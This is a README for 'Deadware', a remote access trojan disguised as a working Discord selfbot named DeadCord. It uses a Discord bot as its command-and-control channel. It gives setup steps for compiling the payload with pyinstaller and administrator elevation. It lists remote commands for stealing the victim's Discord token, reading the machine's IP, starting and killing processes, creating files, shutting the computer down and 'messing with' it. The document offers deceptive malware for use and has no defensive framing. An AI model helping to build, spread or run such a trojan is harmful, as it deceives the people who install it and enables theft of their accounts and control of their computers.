# Deadware
Deadware is a RAT disguised as a Selfbot. It uses a Discord server and bot as a C&C while the `deadcord.py` being the payload. The command prefix for the bot is `d!` and for the selfbot it is `.`

## How to setup
1. Create a Discord Bot in the [Discord developer portal](https://discord.com/developers/applications)
2. In `deadcord.py` replace line `917` with your Discord Bot Token
3. Compile `deadcord.py` with pyinstaller. I would suggest using the following command in step 4 
4. `pyinstaller deadcord.py --onefile --uac-admin`

## Deadware commands
As mentioned, Deadware is disguised as a selfbot called `DeadCord` which is a fully functioning selfbot with over 75 commands. However, the real commands are in the Deadware bot. The following list is the up to date commands:

* test_con - tests connection
* create_file <filename> - creates a file
* start_process <process> - starts process
* computer_shutdown - shuts down computer
* deadware_bomb - messes with computer
* get_token - gets selfbot token
* start_typing <message> - opens notepad and types message
* get_ip - gets machine IP
* end_task <task> - ends a task
* get_tasks - gets current processes running

 




